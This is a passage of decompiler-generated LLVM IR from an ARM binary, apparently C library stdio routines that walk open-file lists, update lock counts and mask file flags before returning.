  %v1_15c84 = load i32, i32* @r7, align 4
  store i32 %v1_15c84, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_15c80, %bb46
  %v1_15c88 = xor i1 %v9_15c80, true
  call void @__pseudo_cond_branch(i1 %v1_15c88, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_15c8c = load i32, i32* %sl.global-to-local, align 4
  %v1_15c8c = load i32, i32* @r7, align 4
  %v2_15c8c = add i32 %v1_15c8c, 8
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  store i32 %v0_15c8c, i32* %v3_15c8c, align 4
  br label %dec_label_pc_15c90

dec_label_pc_15c90:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15c94 = load i32, i32* @r8, align 4
  %v2_15c94 = add i32 %v0_15c94, 160
  %v3_15c94 = inttoptr i32 %v2_15c94 to i32*
  %v4_15c94 = load i32, i32* %v3_15c94, align 4
  store i32 %v4_15c94, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15c9c = add i32 %v0_15c94, 12
  %v3_15c9c = inttoptr i32 %v2_15c9c to i32*
  %v4_15c9c = load i32, i32* %v3_15c9c, align 4
  store i32 %v4_15c9c, i32* %r2.global-to-local, align 4
  %v1_15ca0 = add i32 %v4_15c94, 4
  %v2_15ca0 = inttoptr i32 %v1_15ca0 to i32*
  %v3_15ca0 = load i32, i32* %v2_15ca0, align 4
  store i32 %v3_15ca0, i32* %r1.global-to-local, align 4
  %v1_15ca4 = inttoptr i32 %v4_15c9c to i32*
  %v2_15ca4 = load i32, i32* %v1_15ca4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ca8 = icmp eq i32 %v3_15ca0, 0
  %v1_15cac = add i32 %v2_15ca4, 1
  store i32 %v1_15cac, i32* %r3.global-to-local, align 4
  store i32 %v1_15cac, i32* %v1_15ca4, align 4
  br i1 %v2_15ca8, label %dec_label_pc_15cb8, label %dec_label_pc_15d18

dec_label_pc_15cb8:                               ; preds = %dec_label_pc_15c90
  %v0_15cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_15cb8 = add i32 %v1_15cb8, 8
  %v3_15cb8 = inttoptr i32 %v2_15cb8 to i32*
  store i32 %v0_15cb8, i32* %v3_15cb8, align 4
  %v0_15cbc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15cbc, i32* @r7, align 4
  br label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15cf0.dec_label_pc_15cc0_crit_edge, %dec_label_pc_15cb8
  %v0_15cc0 = phi i32 [ %v0_15cc0.pre, %dec_label_pc_15cf0.dec_label_pc_15cc0_crit_edge ], [ %v0_15cbc, %dec_label_pc_15cb8 ]
  %v1_15cc0 = inttoptr i32 %v0_15cc0 to i32*
  %v2_15cc0 = load i32, i32* %v1_15cc0, align 4
  store i32 %v2_15cc0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15cc0, i32* %r2.global-to-local, align 4
  %v2_15ccc96 = load i32, i32* %v1_15cc0, align 4
  store i32 %v2_15ccc96, i32* %r3.global-to-local, align 4
  %v3_15cd098 = icmp uge i32 %v2_15ccc96, %v2_15cc0
  store i1 %v3_15cd098, i1* %cpsr_c.global-to-local, align 1
  %v9_15cd0104 = icmp eq i32 %v2_15ccc96, %v2_15cc0
  br i1 %v9_15cd0104, label %dec_label_pc_15cd8, label %dec_label_pc_15cf0

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cc0, %dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge
  %v0_15cd8105 = phi i32 [ %v1_15cd0.pre, %dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge ], [ %v2_15cc0, %dec_label_pc_15cc0 ]
  store i32 %v0_15cd8105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ce8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ce8, label %dec_label_pc_15cec, label %dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge

dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge:  ; preds = %dec_label_pc_15cd8
  %v0_15ccc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15cd0.pre = load i32, i32* @r4, align 4
  %v1_15ccc = inttoptr i32 %v0_15ccc.pre to i32*
  %v2_15ccc = load i32, i32* %v1_15ccc, align 4
  store i32 %v2_15ccc, i32* %r3.global-to-local, align 4
  %v3_15cd0 = icmp uge i32 %v2_15ccc, %v1_15cd0.pre
  store i1 %v3_15cd0, i1* %cpsr_c.global-to-local, align 1
  %v9_15cd0 = icmp eq i32 %v2_15ccc, %v1_15cd0.pre
  br i1 %v9_15cd0, label %dec_label_pc_15cd8, label %dec_label_pc_15cf0

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15cd8
  %v0_15cec = load i32, i32* @r4, align 4
  store i32 %v0_15cec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cf0

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15cc0, %dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge, %dec_label_pc_15cec
  %v0_15cf8 = phi i32 [ %v0_15cec, %dec_label_pc_15cec ], [ %v2_15ccc96, %dec_label_pc_15cc0 ], [ %v2_15ccc, %dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge ]
  %v1_15cf0 = phi i32 [ %v0_15cec, %dec_label_pc_15cec ], [ %v2_15cc0, %dec_label_pc_15cc0 ], [ %v1_15cd0.pre, %dec_label_pc_15cd8.dec_label_pc_15ccc_crit_edge ]
  %v3_15cf0 = icmp uge i32 %v0_15cf8, %v1_15cf0
  store i1 %v3_15cf0, i1* %cpsr_c.global-to-local, align 1
  %v9_15cf0 = icmp eq i32 %v0_15cf8, %v1_15cf0
  br i1 %v9_15cf0, label %dec_label_pc_15cf8, label %dec_label_pc_15cf0.dec_label_pc_15cc0_crit_edge

dec_label_pc_15cf0.dec_label_pc_15cc0_crit_edge:  ; preds = %dec_label_pc_15cf0
  %v0_15cc0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15cc0

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15cf0
  %v2_15cf8 = icmp ne i32 %v1_15cf0, 0
  store i1 %v2_15cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_15cfc = icmp slt i32 %v1_15cf0, 2
  br i1 %v7_15cfc, label %dec_label_pc_15d18, label %dec_label_pc_15d00

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15cf8
  %v0_15d00 = load i32, i32* @r7, align 4
  store i32 %v0_15d00, i32* %r0.global-to-local, align 4
  %v0_15d04 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d04 = add i32 %v0_15d04, 129
  store i32 %v1_15d04, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d18

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15c90, %dec_label_pc_15d00, %dec_label_pc_15cf8
  %v0_15d18 = load i32, i32* @r5, align 4
  %v1_15d18 = inttoptr i32 %v0_15d18 to i16*
  %v2_15d18 = load i16, i16* %v1_15d18, align 2
  %v3_15d18 = zext i16 %v2_15d18 to i32
  %v1_15d1c = and i32 %v3_15d18, 24576
  %v1_15d20 = or i32 %v1_15d1c, 48
  store i32 %v1_15d20, i32* %r3.global-to-local, align 4
  %v0_15d24 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d24 = icmp eq i32 %v0_15d24, 0
  %v1_15d28 = trunc i32 %v1_15d20 to i16
  store i16 %v1_15d28, i16* %v1_15d18, align 2
  br i1 %v2_15d24, label %dec_label_pc_15d30, label %dec_label_pc_15da4

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d18
  %v0_15d30 = load i32, i32* @r5, align 4
  %v1_15d30 = add i32 %v0_15d30, 60
  %v2_15d30 = inttoptr i32 %v1_15d30 to i32*
  %v3_15d30 = load i32, i32* %v2_15d30, align 4
  %v1_15d34 = add i32 %v3_15d30, -1
  store i32 %v1_15d34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d38 = icmp eq i32 %v1_15d34, 0
  store i32 %v1_15d34, i32* %v2_15d30, align 4
  br i1 %v2_15d38, label %dec_label_pc_15d44, label %dec_label_pc_15da4

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d30
  %v0_15d44 = load i32, i32* %r3.global-to-local, align 4
  %v1_15d44 = load i32, i32* @r5, align 4
  %v2_15d44 = add i32 %v1_15d44, 64
  %v3_15d44 = inttoptr i32 %v2_15d44 to i32*
  store i32 %v0_15d44, i32* %v3_15d44, align 4
  %v0_15d48 = load i32, i32* @r5, align 4
  %v1_15d48 = add i32 %v0_15d48, 56
  store i32 %v1_15d48, i32* @r6, align 4
  br label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d7c.dec_label_pc_15d4c_crit_edge, %dec_label_pc_15d44
  %v0_15d54 = phi i32 [ %v0_15d54.pre, %dec_label_pc_15d7c.dec_label_pc_15d4c_crit_edge ], [ %v1_15d48, %dec_label_pc_15d44 ]
  %v0_15d4c = phi i32 [ %v0_15d4c.pre, %dec_label_pc_15d7c.dec_label_pc_15d4c_crit_edge ], [ %v0_15d48, %dec_label_pc_15d44 ]
  %v1_15d4c = add i32 %v0_15d4c, 56
  %v2_15d4c = inttoptr i32 %v1_15d4c to i32*
  %v3_15d4c = load i32, i32* %v2_15d4c, align 4
  store i32 %v3_15d4c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15d54, i32* %r2.global-to-local, align 4
  %v1_15d5882 = inttoptr i32 %v0_15d54 to i32*
  %v2_15d5883 = load i32, i32* %v1_15d5882, align 4
  store i32 %v2_15d5883, i32* %r3.global-to-local, align 4
  %v3_15d5c85 = icmp uge i32 %v2_15d5883, %v3_15d4c
  store i1 %v3_15d5c85, i1* %cpsr_c.global-to-local, align 1
  %v9_15d5c91 = icmp eq i32 %v2_15d5883, %v3_15d4c
  br i1 %v9_15d5c91, label %dec_label_pc_15d64, label %dec_label_pc_15d7c

dec_label_pc_15d64:                               ; preds = %dec_label_pc_15d4c, %dec_label_pc_15d64.dec_label_pc_15d58_crit_edge
  %v0_15d6492 = phi i32 [ %v1_15d5c.pre, %dec_label_pc_15d64.dec_label_pc_15d58_crit_edge ], [ %v3_15d4c, %dec_label_pc_15d4c ]
  store i32 %v0_15d6492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d74, label %dec_label_pc_15d78, label %dec_label_pc_15d64.dec_label_pc_15d58_crit_edge

dec_label_pc_15d64.dec_label_pc_15d58_crit_edge:  ; preds = %dec_label_pc_15d64
  %v0_15d58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d5c.pre = load i32, i32* @r4, align 4
  %v1_15d58 = inttoptr i32 %v0_15d58.pre to i32*
  %v2_15d58 = load i32, i32* %v1_15d58, align 4
  store i32 %v2_15d58, i32* %r3.global-to-local, align 4
  %v3_15d5c = icmp uge i32 %v2_15d58, %v1_15d5c.pre
  store i1 %v3_15d5c, i1* %cpsr_c.global-to-local, align 1
  %v9_15d5c = icmp eq i32 %v2_15d58, %v1_15d5c.pre
  br i1 %v9_15d5c, label %dec_label_pc_15d64, label %dec_label_pc_15d7c

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d64
  %v0_15d78 = load i32, i32* @r4, align 4
  store i32 %v0_15d78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d7c

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d4c, %dec_label_pc_15d64.dec_label_pc_15d58_crit_edge, %dec_label_pc_15d78
  %v0_15d84 = phi i32 [ %v0_15d78, %dec_label_pc_15d78 ], [ %v2_15d5883, %dec_label_pc_15d4c ], [ %v2_15d58, %dec_label_pc_15d64.dec_label_pc_15d58_crit_edge ]
  %v1_15d7c = phi i32 [ %v0_15d78, %dec_label_pc_15d78 ], [ %v3_15d4c, %dec_label_pc_15d4c ], [ %v1_15d5c.pre, %dec_label_pc_15d64.dec_label_pc_15d58_crit_edge ]
  %v3_15d7c = icmp uge i32 %v0_15d84, %v1_15d7c
  store i1 %v3_15d7c, i1* %cpsr_c.global-to-local, align 1
  %v9_15d7c = icmp eq i32 %v0_15d84, %v1_15d7c
  br i1 %v9_15d7c, label %dec_label_pc_15d84, label %dec_label_pc_15d7c.dec_label_pc_15d4c_crit_edge

dec_label_pc_15d7c.dec_label_pc_15d4c_crit_edge:  ; preds = %dec_label_pc_15d7c
  %v0_15d4c.pre = load i32, i32* @r5, align 4
  %v0_15d54.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15d4c

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d7c
  %v2_15d84 = icmp ne i32 %v1_15d7c, 0
  store i1 %v2_15d84, i1* %cpsr_c.global-to-local, align 1
  %v7_15d88 = icmp slt i32 %v1_15d7c, 2
  br i1 %v7_15d88, label %dec_label_pc_15da4, label %dec_label_pc_15d8c

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d84
  %v0_15d8c = load i32, i32* @r5, align 4
  %v1_15d8c = add i32 %v0_15d8c, 56
  store i32 %v1_15d8c, i32* %r0.global-to-local, align 4
  %v0_15d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d90 = add i32 %v0_15d90, 129
  store i32 %v1_15d90, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d30, %dec_label_pc_15d18, %dec_label_pc_15d8c, %dec_label_pc_15d84
  %v0_15da4 = load i32, i32* @r5, align 4
  %v1_15da4 = inttoptr i32 %v0_15da4 to i16*
  %v2_15da4 = load i16, i16* %v1_15da4, align 2
  %v3_15da4 = zext i16 %v2_15da4 to i32
  store i32 %v3_15da4, i32* %r3.global-to-local, align 4
  %v1_15da8 = and i32 %v3_15da4, 16384
  %v2_15da8 = icmp eq i32 %v1_15da8, 0
  br i1 %v2_15da8, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15da4
  %v2_15dac = add i32 %v0_15da4, 8
  %v3_15dac = inttoptr i32 %v2_15dac to i32*
  %v4_15dac = load i32, i32* %v3_15dac, align 4
  store i32 %v4_15dac, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15da4, %bb48
  %v1_15db0 = xor i1 %v2_15da8, true
  call void @__pseudo_cond_branch(i1 %v1_15db0, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15db8 = load i32, i32* @r8, align 4
  %v2_15db8 = add i32 %v0_15db8, 160
  %v3_15db8 = inttoptr i32 %v2_15db8 to i32*
  %v4_15db8 = load i32, i32* %v3_15db8, align 4
  store i32 %v4_15db8, i32* @r5, align 4
  %v1_15dbc = add i32 %v4_15db8, 8
  %v2_15dbc = inttoptr i32 %v1_15dbc to i32*
  %v3_15dbc = load i32, i32* %v2_15dbc, align 4
  store i32 %v3_15dbc, i32* %r3.global-to-local, align 4
  %v1_15dc0 = load i32, i32* %sl.global-to-local, align 4
  %v3_15dc0 = icmp uge i32 %v3_15dbc, %v1_15dc0
  store i1 %v3_15dc0, i1* %cpsr_c.global-to-local, align 1
  %v9_15dc0 = icmp eq i32 %v3_15dbc, %v1_15dc0
  br i1 %v9_15dc0, label %dec_label_pc_15e08, label %dec_label_pc_15dc8

dec_label_pc_15dc8:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15db8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15dd475 = inttoptr i32 %v4_15db8 to i32*
  %v2_15dd476 = load i32, i32* %v1_15dd475, align 4
  store i32 %v2_15dd476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd878 = icmp eq i32 %v2_15dd476, 0
  br i1 %v9_15dd878, label %dec_label_pc_15de0, label %dec_label_pc_15df8

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15dc8, %dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge
  %v0_15de079 = phi i32 [ %v1_15dd8.pre, %dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge ], [ 0, %dec_label_pc_15dc8 ]
  store i32 %v0_15de079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15df0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15df0, label %dec_label_pc_15df4, label %dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge

dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge:  ; preds = %dec_label_pc_15de0
  %v0_15dd4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15dd8.pre = load i32, i32* @r4, align 4
  %v1_15dd4 = inttoptr i32 %v0_15dd4.pre to i32*
  %v2_15dd4 = load i32, i32* %v1_15dd4, align 4
  store i32 %v2_15dd4, i32* %r3.global-to-local, align 4
  %v3_15dd8 = icmp uge i32 %v2_15dd4, %v1_15dd8.pre
  store i1 %v3_15dd8, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd8 = icmp eq i32 %v2_15dd4, %v1_15dd8.pre
  br i1 %v9_15dd8, label %dec_label_pc_15de0, label %dec_label_pc_15df8

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15de0
  %v0_15df4 = load i32, i32* @r4, align 4
  store i32 %v0_15df4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15df8

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15dc8, %dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge, %dec_label_pc_15df4
  %v0_15df8 = phi i32 [ %v0_15df4, %dec_label_pc_15df4 ], [ %v2_15dd476, %dec_label_pc_15dc8 ], [ %v2_15dd4, %dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge ]
  %v1_15df8 = phi i32 [ %v0_15df4, %dec_label_pc_15df4 ], [ 0, %dec_label_pc_15dc8 ], [ %v1_15dd8.pre, %dec_label_pc_15de0.dec_label_pc_15dd4_crit_edge ]
  %v3_15df8 = icmp uge i32 %v0_15df8, %v1_15df8
  store i1 %v3_15df8, i1* %cpsr_c.global-to-local, align 1
  %v9_15df8 = icmp eq i32 %v0_15df8, %v1_15df8
  br i1 %v9_15df8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_15df8
  %v1_15dfc = load i32, i32* @r5, align 4
  store i32 %v1_15dfc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_15df8, %bb50
  %v1_15e00 = xor i1 %v9_15df8, true
  call void @__pseudo_cond_branch(i1 %v1_15e00, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_15e04 = load i32, i32* %sl.global-to-local, align 4
  %v1_15e04 = load i32, i32* @r5, align 4
  %v2_15e04 = add i32 %v1_15e04, 8
  %v3_15e04 = inttoptr i32 %v2_15e04 to i32*
  store i32 %v0_15e04, i32* %v3_15e04, align 4
  %v0_15e0c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15e08

dec_label_pc_15e08:                               ; preds = %bb49, %bb51
  %v0_15e0c = phi i32 [ %v0_15db8, %bb49 ], [ %v0_15e0c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_15e0c = add i32 %v0_15e0c, 80
  %v3_15e0c = inttoptr i32 %v2_15e0c to i32*
  %v4_15e0c = load i32, i32* %v3_15e0c, align 4
  store i32 %v4_15e0c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_15e14 = add i32 %v0_15e0c, 160
  %v3_15e14 = inttoptr i32 %v2_15e14 to i32*
  %v4_15e14 = load i32, i32* %v3_15e14, align 4
  store i32 %v4_15e14, i32* %r0.global-to-local, align 4
  %v1_15e18 = inttoptr i32 %v4_15e0c to i32*
  %v2_15e18 = load i32, i32* %v1_15e18, align 4
  store i32 %v2_15e18, i32* %r3.global-to-local, align 4
  %v1_15e1c = add i32 %v4_15e14, 4
  %v2_15e1c = inttoptr i32 %v1_15e1c to i32*
  %v3_15e1c = load i32, i32* %v2_15e1c, align 4
  store i32 %v3_15e1c, i32* %r1.global-to-local, align 4
  %v1_15e20 = add i32 %v2_15e18, 1
  store i32 %v1_15e20, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e24 = icmp eq i32 %v3_15e1c, 0
  store i32 %v1_15e20, i32* %v1_15e18, align 4
  br i1 %v2_15e24, label %dec_label_pc_15e30, label %dec_label_pc_15e90

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e08
  %v0_15e30 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e30 = load i32, i32* %r0.global-to-local, align 4
  %v2_15e30 = add i32 %v1_15e30, 8
  %v3_15e30 = inttoptr i32 %v2_15e30 to i32*
  store i32 %v0_15e30, i32* %v3_15e30, align 4
  %v0_15e34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15e34, i32* @r5, align 4
  br label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e68.dec_label_pc_15e38_crit_edge, %dec_label_pc_15e30
  %v0_15e38 = phi i32 [ %v0_15e38.pre, %dec_label_pc_15e68.dec_label_pc_15e38_crit_edge ], [ %v0_15e34, %dec_label_pc_15e30 ]
  %v1_15e38 = inttoptr i32 %v0_15e38 to i32*
  %v2_15e38 = load i32, i32* %v1_15e38, align 4
  store i32 %v2_15e38, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15e38, i32* %r2.global-to-local, align 4
  %v2_15e4464 = load i32, i32* %v1_15e38, align 4
  store i32 %v2_15e4464, i32* %r3.global-to-local, align 4
  %v3_15e4866 = icmp uge i32 %v2_15e4464, %v2_15e38
  store i1 %v3_15e4866, i1* %cpsr_c.global-to-local, align 1
  %v9_15e4872 = icmp eq i32 %v2_15e4464, %v2_15e38
  br i1 %v9_15e4872, label %dec_label_pc_15e50, label %dec_label_pc_15e68

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e38, %dec_label_pc_15e50.dec_label_pc_15e44_crit_edge
  %v0_15e5073 = phi i32 [ %v1_15e48.pre, %dec_label_pc_15e50.dec_label_pc_15e44_crit_edge ], [ %v2_15e38, %dec_label_pc_15e38 ]
  store i32 %v0_15e5073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15e60 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15e60, label %dec_label_pc_15e64, label %dec_label_pc_15e50.dec_label_pc_15e44_crit_edge

dec_label_pc_15e50.dec_label_pc_15e44_crit_edge:  ; preds = %dec_label_pc_15e50
  %v0_15e44.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15e48.pre = load i32, i32* @r4, align 4
  %v1_15e44 = inttoptr i32 %v0_15e44.pre to i32*
  %v2_15e44 = load i32, i32* %v1_15e44, align 4
  store i32 %v2_15e44, i32* %r3.global-to-local, align 4
  %v3_15e48 = icmp uge i32 %v2_15e44, %v1_15e48.pre
  store i1 %v3_15e48, i1* %cpsr_c.global-to-local, align 1
  %v9_15e48 = icmp eq i32 %v2_15e44, %v1_15e48.pre
  br i1 %v9_15e48, label %dec_label_pc_15e50, label %dec_label_pc_15e68

dec_label_pc_15e64:                               ; preds = %dec_label_pc_15e50
  %v0_15e64 = load i32, i32* @r4, align 4
  store i32 %v0_15e64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e68

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15e38, %dec_label_pc_15e50.dec_label_pc_15e44_crit_edge, %dec_label_pc_15e64
  %v0_15e70 = phi i32 [ %v0_15e64, %dec_label_pc_15e64 ], [ %v2_15e4464, %dec_label_pc_15e38 ], [ %v2_15e44, %dec_label_pc_15e50.dec_label_pc_15e44_crit_edge ]
  %v1_15e68 = phi i32 [ %v0_15e64, %dec_label_pc_15e64 ], [ %v2_15e38, %dec_label_pc_15e38 ], [ %v1_15e48.pre, %dec_label_pc_15e50.dec_label_pc_15e44_crit_edge ]
  %v3_15e68 = icmp uge i32 %v0_15e70, %v1_15e68
  store i1 %v3_15e68, i1* %cpsr_c.global-to-local, align 1
  %v9_15e68 = icmp eq i32 %v0_15e70, %v1_15e68
  br i1 %v9_15e68, label %dec_label_pc_15e70, label %dec_label_pc_15e68.dec_label_pc_15e38_crit_edge

dec_label_pc_15e68.dec_label_pc_15e38_crit_edge:  ; preds = %dec_label_pc_15e68
  %v0_15e38.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e38

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e68
  %v2_15e70 = icmp ne i32 %v1_15e68, 0
  store i1 %v2_15e70, i1* %cpsr_c.global-to-local, align 1
  %v7_15e74 = icmp slt i32 %v1_15e68, 2
  br i1 %v7_15e74, label %dec_label_pc_15e90, label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e70
  %v0_15e78 = load i32, i32* @r5, align 4
  store i32 %v0_15e78, i32* %r0.global-to-local, align 4
  %v0_15e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_15e7c = add i32 %v0_15e7c, 129
  store i32 %v1_15e7c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e90

dec_label_pc_15e90:                               ; preds = %dec_label_pc_15e08, %dec_label_pc_15e78, %dec_label_pc_15e70
  %v0_15e90 = call i32 @_stdio_openlist_dec_use()
  %v0_15e94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15e94, i32* %r0.global-to-local, align 4
  %v2_15e9c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15e9c, i32* @r4, align 4
  store i32 %v6_15b84, i32* @r5, align 4
  store i32 %v9_15b84, i32* @r6, align 4
  store i32 %v12_15b84, i32* @r7, align 4
  ret i32 %v0_15e94

; uselistorder directives
  uselistorder i32 %v0_15e64, { 1, 0, 2 }
  uselistorder i32 %v1_15e48.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15e38, { 1, 0 }
  uselistorder i32 %v0_15e0c, { 1, 0 }
  uselistorder i32 %v0_15df4, { 1, 0, 2 }
  uselistorder i32 %v1_15dd8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15dc0, { 1, 0 }
  uselistorder i32 %v0_15d78, { 1, 0, 2 }
  uselistorder i32 %v1_15d5c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15cec, { 1, 0, 2 }
  uselistorder i32 %v1_15cd0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15cc0, { 1, 0 }
  uselistorder i32 %v0_15c7c, { 1, 0, 2 }
  uselistorder i32 %v1_15c60.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15c40, { 1, 0 }
  uselistorder i32 %v1_15bcc.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 27, 26, 33, 32, 25, 31, 30, 3, 2, 28, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 0, 7, 6, 5, 4, 1 }
  uselistorder label %dec_label_pc_15e90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15e68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %dec_label_pc_15e08, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_15df8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15de0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15da4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15d7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d64, { 1, 0 }
  uselistorder label %dec_label_pc_15d18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15cf0, { 2, 1, 0 }
